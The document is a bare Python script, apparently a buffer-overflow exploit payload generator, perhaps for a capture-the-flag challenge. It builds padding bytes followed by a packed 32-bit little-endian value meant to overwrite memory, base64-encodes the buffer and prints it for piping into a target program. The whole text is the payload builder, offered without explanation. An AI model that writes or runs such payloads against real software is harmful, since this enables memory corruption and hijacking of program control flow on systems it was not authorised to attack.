
import sys
import struct
import base64

buf = b'ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp'
buf += struct.pack('<I', 2754360540)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
